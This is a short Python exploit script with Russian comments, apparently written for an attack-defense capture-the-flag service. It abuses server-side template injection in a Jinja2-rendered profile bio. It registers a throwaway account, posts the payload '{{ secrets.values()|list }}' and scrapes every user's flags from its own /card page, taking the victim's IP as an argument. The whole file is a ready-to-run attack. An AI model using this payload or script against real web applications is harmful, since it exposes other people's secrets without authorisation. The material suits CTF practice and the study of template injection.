#!/usr/bin/env python3
"""profile — SSTI в /card. bio рендерится через Jinja2, а в контекст рендера
прокинут secrets со ВСЕМИ флагами. Регистрируем одноразового юзера, ставим ему
bio-пейлоад и читаем свою же карточку — в ней чужие секреты.
Запуск: profile.py <ip_жертвы> [порт]  (флаги построчно в stdout)."""
import os
import re
import sys

import requests

FLAG = re.compile(os.environ.get("FLAG_FORMAT", r"[A-Z0-9]{31}="))
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", "5006"))
BASE = f"http://{HOST}:{PORT}"

# SSTI: выгружает значения всех секретов из контекста рендера.
PAYLOAD = "{{ secrets.values()|list }}"

flags = set()
try:
    u = "x" + str(id(object()))
    p = "p" + str(id(object()))
    tok = requests.post(f"{BASE}/register", json={"username": u, "password": p}, timeout=4) \
        .json()["token"]
    requests.post(f"{BASE}/bio", json={"bio": PAYLOAD},
                  headers={"Authorization": tok}, timeout=4)
    card = requests.get(f"{BASE}/card", headers={"Authorization": tok}, timeout=4) \
        .json().get("card", "") or ""
    flags.update(FLAG.findall(card))
except (requests.RequestException, ValueError, KeyError):
    pass

for f in sorted(flags):
    print(f)
